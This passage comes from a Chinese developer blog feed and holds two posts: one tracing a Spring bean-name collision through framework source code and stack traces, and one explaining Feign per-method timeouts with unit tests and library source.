Resolve BeanDefinitionHolder: contains BeanDefinition with name and aliases.</span></span><br><span class="line">			BeanDefinitionHolder bdHolder = (BeanDefinitionHolder) value;</span><br><span class="line">			<span class="keyword">return</span> resolveInnerBean(argName, bdHolder.getBeanName(), bdHolder.getBeanDefinition());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> BeanDefinition) &#123;</span><br><span class="line">			<span class="comment">// Resolve plain BeanDefinition, without contained name: use dummy name.</span></span><br><span class="line">			BeanDefinition bd = (BeanDefinition) value;</span><br><span class="line">			String innerBeanName = <span class="string">"(inner bean)"</span> + BeanFactoryUtils.GENERATED_BEAN_NAME_SEPARATOR +</span><br><span class="line">					ObjectUtils.getIdentityHexString(bd);</span><br><span class="line">			<span class="keyword">return</span> resolveInnerBean(argName, innerBeanName, bd);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedArray) &#123;</span><br><span class="line">			<span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line">			ManagedArray array = (ManagedArray) value;</span><br><span class="line">			Class&lt;?&gt; elementType = array.resolvedElementType;</span><br><span class="line">			<span class="keyword">if</span> (elementType == <span class="keyword">null</span>) &#123;</span><br><span class="line">				String elementTypeName = array.getElementTypeName();</span><br><span class="line">				<span class="keyword">if</span> (StringUtils.hasText(elementTypeName)) &#123;</span><br><span class="line">					<span class="keyword">try</span> &#123;</span><br><span class="line">						elementType = ClassUtils.forName(elementTypeName, <span class="keyword">this</span>.beanFactory.getBeanClassLoader());</span><br><span class="line">						array.resolvedElementType = elementType;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">						<span class="comment">// Improve the message by showing the context.</span></span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line">								<span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line">								<span class="string">"Error resolving array type for "</span> + argName, ex);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					elementType = Object<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> resolveManagedArray(argName, (List&lt;?&gt;) value, elementType);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedList) &#123;</span><br><span class="line">			<span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line">			<span class="keyword">return</span> resolveManagedList(argName, (List&lt;?&gt;) value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedSet) &#123;</span><br><span class="line">			<span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line">			<span class="keyword">return</span> resolveManagedSet(argName, (Set&lt;?&gt;) value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedMap) &#123;</span><br><span class="line">			<span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line">			<span class="keyword">return</span> resolveManagedMap(argName, (Map&lt;?, ?&gt;) value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedProperties) &#123;</span><br><span class="line">			Properties original = (Properties) value;</span><br><span class="line">			Properties copy = <span class="keyword">new</span> Properties();</span><br><span class="line">			original.forEach((propKey, propValue) -&gt; &#123;</span><br><span class="line">				<span class="keyword">if</span> (propKey <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line">					propKey = evaluate((TypedStringValue) propKey);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (propValue <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line">					propValue = evaluate((TypedStringValue) propValue);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (propKey == <span class="keyword">null</span> || propValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line">							<span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line">							<span class="string">"Error converting Properties key/value pair for "</span> + argName + <span class="string">": resolved to null"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				copy.put(propKey, propValue);</span><br><span class="line">			&#125;);</span><br><span class="line">			<span class="keyword">return</span> copy;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line">			<span class="comment">// Convert value to target type here.</span></span><br><span class="line">			TypedStringValue typedStringValue = (TypedStringValue) value;</span><br><span class="line">			Object valueObject = evaluate(typedStringValue);</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Class&lt;?&gt; resolvedTargetType = resolveTargetType(typedStringValue);</span><br><span class="line">				<span class="keyword">if</span> (resolvedTargetType != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">this</span>.typeConverter.convertIfNecessary(valueObject, resolvedTargetType);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">return</span> valueObject;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">				<span class="comment">// Improve the message by showing the context.</span></span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line">						<span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line">						<span class="string">"Error converting typed String value for "</span> + argName, ex);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> NullBean) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> evaluate(value);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>debug看了下，也确实是对的：</p>
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429120415453.png">
<p>跟进去， 发现：</p>
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429120839555.png">
<p>老的dao层关联的sessionFactory居然是新的（扫描路径不一样，这里只加载了新的mapper文件）。根据名称获取一把：</p>
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429121457725.png">
<h2 id="bean注册"><a href="#bean注册" class="headerlink" title="bean注册"></a>bean注册</h2><img src="/2020/04/29/spring-bean-duplic-name/image-20200429125600021.png">
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429125633517.png">
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//---------------------------------------------------------------------</span></span><br><span class="line">	<span class="comment">// Implementation of BeanDefinitionRegistry interface</span></span><br><span class="line">	<span class="comment">//---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerBeanDefinition</span><span class="params">(String beanName, BeanDefinition beanDefinition)</span></span></span><br><span class="line"><span class="function">			<span class="keyword">throws</span> BeanDefinitionStoreException </span>&#123;</span><br><span class="line"></span><br><span class="line">		Assert.hasText(beanName, <span class="string">"Bean name must not be empty"</span>);</span><br><span class="line">		Assert.notNull(beanDefinition, <span class="string">"BeanDefinition must not be null"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (beanDefinition <span class="keyword">instanceof</span> AbstractBeanDefinition) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				((AbstractBeanDefinition) beanDefinition).validate();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (BeanDefinitionValidationException ex) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,</span><br><span class="line">						<span class="string">"Validation of bean definition failed"</span>, ex);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里发生了覆盖</span></span><br><span class="line">		BeanDefinition existingDefinition = <span class="keyword">this</span>.beanDefinitionMap.get(beanName);</span><br><span class="line">		<span class="keyword">if</span> (existingDefinition != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!isAllowBeanDefinitionOverriding()) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,</span><br><span class="line">						<span class="string">"Cannot register bean definition ["</span> + beanDefinition + <span class="string">"] for bean '"</span> + beanName +</span><br><span class="line">						<span class="string">"': There is already ["</span> + existingDefinition + <span class="string">"] bound."</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (existingDefinition.getRole() &lt; beanDefinition.getRole()) &#123;</span><br><span class="line">				<span class="comment">// e.g. was ROLE_APPLICATION, now overriding with ROLE_SUPPORT or ROLE_INFRASTRUCTURE</span></span><br><span class="line">				<span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">					logger.warn(<span class="string">"Overriding user-defined bean definition for bean '"</span> + beanName +</span><br><span class="line">							<span class="string">"' with a framework-generated bean definition: replacing ["</span> +</span><br><span class="line">							existingDefinition + <span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (!beanDefinition.equals(existingDefinition)) &#123;</span><br><span class="line">        <span class="comment">// 走到了这里，打印了override的日志，不过是info级别的</span></span><br><span class="line">				<span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">					logger.info(<span class="string">"Overriding bean definition for bean '"</span> + beanName +</span><br><span class="line">							<span class="string">"' with a different definition: replacing ["</span> + existingDefinition +</span><br><span class="line">							<span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">					logger.debug(<span class="string">"Overriding bean definition for bean '"</span> + beanName +</span><br><span class="line">							<span class="string">"' with an equivalent definition: replacing ["</span> + existingDefinition +</span><br><span class="line">							<span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (hasBeanCreationStarted()) &#123;</span><br><span class="line">				<span class="comment">// Cannot modify startup-time collection elements anymore (for stable iteration)</span></span><br><span class="line">				<span class="keyword">synchronized</span> (<span class="keyword">this</span>.beanDefinitionMap) &#123;</span><br><span class="line">					<span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">					List&lt;String&gt; updatedDefinitions = <span class="keyword">new</span> ArrayList&lt;&gt;(<span class="keyword">this</span>.beanDefinitionNames.size() + <span class="number">1</span>);</span><br><span class="line">					updatedDefinitions.addAll(<span class="keyword">this</span>.beanDefinitionNames);</span><br><span class="line">					updatedDefinitions.add(beanName);</span><br><span class="line">					<span class="keyword">this</span>.beanDefinitionNames = updatedDefinitions;</span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">this</span>.manualSingletonNames.contains(beanName)) &#123;</span><br><span class="line">						Set&lt;String&gt; updatedSingletons = <span class="keyword">new</span> LinkedHashSet&lt;&gt;(<span class="keyword">this</span>.manualSingletonNames);</span><br><span class="line">						updatedSingletons.remove(beanName);</span><br><span class="line">						<span class="keyword">this</span>.manualSingletonNames = updatedSingletons;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// Still in startup registration phase</span></span><br><span class="line">				<span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">				<span class="keyword">this</span>.beanDefinitionNames.add(beanName);</span><br><span class="line">				<span class="keyword">this</span>.manualSingletonNames.remove(beanName);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">this</span>.frozenBeanDefinitionNames = <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (existingDefinition != <span class="keyword">null</span> || containsSingleton(beanName)) &#123;</span><br><span class="line">			resetBeanDefinition(beanName);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429125804639.png">
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>最终排查下来，发现只是bean的名称重复，导致覆盖；跟<code>@Primary</code>没有关系。在成文的过程中又一起<strong>不加思索地复制粘贴</strong>引起的故障</p>
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429130442650.png">
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of <span class="built_in">type</span> <span class="string">'com.atour.pay.api.remote.statistics.TransStatisticsRemote'</span> available</span><br><span class="line">	at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:347)</span><br><span class="line">	at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:334)</span><br><span class="line">	at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1103)</span><br></pre></td></tr></table></figure>
<p>还是需要保持敬畏之心，多去了解，不能无脑的粘贴。同时我们的基础建设不够完善，才导致了这么多复制粘贴的代码，道阻且长！</p>
<p>覆盖的规则可以参考， <a href="https://blog.csdn.net/f641385712/article/details/93777536" rel="external nofollow noopener noreferrer" target="_blank">聊聊Spring的bean覆盖（存在同名name/id问题），介绍Spring名称生成策略接口BeanNameGenerator【享学Spring】_Java_BAT的乌托邦-CSDN博客</a>, 这里简单贴下结论：</p>
<blockquote>
<ul>
<li>同一个配置文件内同名的<code>Bean</code>，<strong>以最上面定义的为准</strong></li>
<li>不同配置文件中存在同名Bean，<code>后解析</code>的配置文件会覆盖<code>先解析</code>的配置文件（配置文件的先后顺序其实会受到<code>@Order</code>来控制）</li>
<li>通过<code>@ComponentScan</code>扫描进来的优先级是最低的，原因就是它扫描进来的Bean定义是<strong>最先</strong>被注册的~</li>
<li>在不同容器内，即使<code>Bean</code>名称相同，它们也是能够<strong>和谐共存</strong>的（想想父子容器）</li>
</ul>
</blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.iflym.com/index.php/code/201208290002.html" rel="external nofollow noopener noreferrer" target="_blank">Spring中获取一个bean的流程-2 – i flym</a></li>
<li><a href="https://blog.csdn.net/f641385712/article/details/93777536" rel="external nofollow noopener noreferrer" target="_blank">聊聊Spring的bean覆盖（存在同名name/id问题），介绍Spring名称生成策略接口BeanNameGenerator【享学Spring】_Java_BAT的乌托邦-CSDN博客</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring-bean </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Feign方法级别的超时]]></title>
      <url>http://qsli.github.io/2020/04/28/feign-method-timeout/</url>
      <content type="html"><![CDATA[<img src="/2020/04/28/feign-method-timeout/image-20200428135947174.png">
<h2 id="Feign方法级别的超时"><a href="#Feign方法级别的超时" class="headerlink" title="Feign方法级别的超时"></a>Feign方法级别的超时</h2><ul>
<li><p>discussion</p>
<p><a href="https://github.com/OpenFeign/feign/issues/562" rel="external nofollow noopener noreferrer" target="_blank">Per request timeout options · Issue #562 · OpenFeign/feign</a></p>
</li>
<li><p>版本 &gt;= 10.3.0</p>
</li>
</ul>
<img src="/2020/04/28/feign-method-timeout/WeChatWorkScreenshot_cb1954f6-abee-48ad-8dc5-14e9ef579bb9.png">
<ul>
<li>源码中的单测：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> pengfei.zhao</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OptionsTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">interface</span> <span class="title">OptionsInterface</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestLine</span>(<span class="string">"GET /"</span>)</span><br><span class="line">    <span class="comment">// 参数中多了一个超时的配置</span></span><br><span class="line">    <span class="function">String <span class="title">get</span><span class="params">(Request.Options options)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestLine</span>(<span class="string">"GET /"</span>)</span><br><span class="line">    <span class="function">String <span class="title">get</span><span class="params">()</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Rule</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">final</span> ExpectedException thrown = ExpectedException.none();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 测试总的配置会导致超时</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">socketTimeoutTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MockWebServer server = <span class="keyword">new</span> MockWebServer();</span><br><span class="line">    server.enqueue(<span class="keyword">new</span> MockResponse().setBody(<span class="string">"foo"</span>).setBodyDelay(<span class="number">3</span>, TimeUnit.SECONDS));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> OptionsInterface api = Feign.builder()</span><br><span class="line">        .options(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">1000</span>))</span><br><span class="line">        .target(OptionsInterface.class, server.url("/").toString());</span><br><span class="line"></span><br><span class="line">    thrown.expect(FeignException<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    thrown.expectCause(CoreMatchers.isA(SocketTimeoutException<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line"></span><br><span class="line">    api.get();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 接口级别的配置可以覆盖总的配置，从而在等待3s之后拿到结果</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">normalResponseTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MockWebServer server = <span class="keyword">new</span> MockWebServer();</span><br><span class="line">    server.enqueue(<span class="keyword">new</span> MockResponse().setBody(<span class="string">"foo"</span>).setBodyDelay(<span class="number">3</span>, TimeUnit.SECONDS));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> OptionsInterface api = Feign.builder()</span><br><span class="line">        .options(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">1000</span>))</span><br><span class="line">        .target(OptionsInterface.class, server.url("/").toString());</span><br><span class="line"></span><br><span class="line">    assertThat(api.get(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">4</span> * <span class="number">1000</span>))).isEqualTo(<span class="string">"foo"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="部分源码"><a href="#部分源码" class="headerlink" title="部分源码"></a>部分源码</h3><p>版本：<code>10.10.1</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// feign.SynchronousMethodHandler#invoke</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object[] argv)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    RequestTemplate template = buildTemplateFromArgs.create(argv);</span><br><span class="line">    <span class="comment">// 从参数中找对应的option</span></span><br><span class="line">    Options options = findOptions(argv);</span><br><span class="line">    Retryer retryer = <span class="keyword">this</span>.retryer.clone();</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> executeAndDecode(template, options);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (RetryableException e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          retryer.continueOrPropagate(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RetryableException th) &#123;</span><br><span class="line">          Throwable cause = th.getCause();</span><br><span class="line">          <span class="keyword">if</span> (propagationPolicy == UNWRAP &amp;&amp; cause != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> cause;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logLevel != Logger.Level.NONE) &#123;</span><br><span class="line">          logger.logRetry(metadata.configKey(), logLevel);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><code>findOptions</code>的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Options <span class="title">findOptions</span><span class="params">(Object[] argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argv == <span class="keyword">null</span> || argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.options;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Stream.of(argv)</span><br><span class="line">      .filter(Options.class::isInstance)</span><br><span class="line">      .map(Options.class::cast)</span><br><span class="line">      .findFirst()</span><br><span class="line">    	<span class="comment">// fall back to总的超时</span></span><br><span class="line">      .orElse(<span class="keyword">this</span>.options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>如果使用<code>feign-ribbon</code>，版本要和<code>feign-core</code>保持一致，不然会报错：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: url values must be not be absolute.</span><br><span class="line"></span><br><span class="line">	at feign.RequestTemplate.uri(RequestTemplate.java:438)</span><br><span class="line">	at feign.RequestTemplate.uri(RequestTemplate.java:425)</span><br><span class="line">	at feign.RequestTemplate.append(RequestTemplate.java:392)</span><br><span class="line">	at feign.ribbon.LBClient<span class="variable">$RibbonRequest</span>.toRequest(LBClient.java:100)</span><br><span class="line">	at feign.ribbon.LBClient.getRequestSpecificRetryHandler(LBClient.java:79)</span><br><span class="line">	at feign.ribbon.LBClient.getRequestSpecificRetryHandler(LBClient.java:38)</span><br><span class="line">	at com.netflix.client.AbstractLoadBalancerAwareClient.buildLoadBalancerCommand(AbstractLoadBalancerAwareClient.java:127)</span><br><span class="line">	at com.netflix.client.AbstractLoadBalancerAwareClient.executeWithLoadBalancer(AbstractLoadBalancerAwareClient.java:94)</span><br><span class="line">	at feign.ribbon.RibbonClient.execute(RibbonClient.java:69)</span><br><span class="line">	at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:119)</span><br><span class="line">	at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89)</span><br><span class="line">	at feign.ReflectiveFeign<span class="variable">$FeignInvocationHandler</span>.invoke(ReflectiveFeign.java:100)</span><br><span class="line">	at com.sun.proxy.<span class="variable">$Proxy36</span>.getEffectiveMebIds(Unknown Source)</span><br></pre></td></tr></table></figure>
<img src="/2020/04/28/feign-method-timeout/image-20200428135018581.png">
<p><code>vip</code>没有解析出来，版本改了之后就没有问题了:</p>
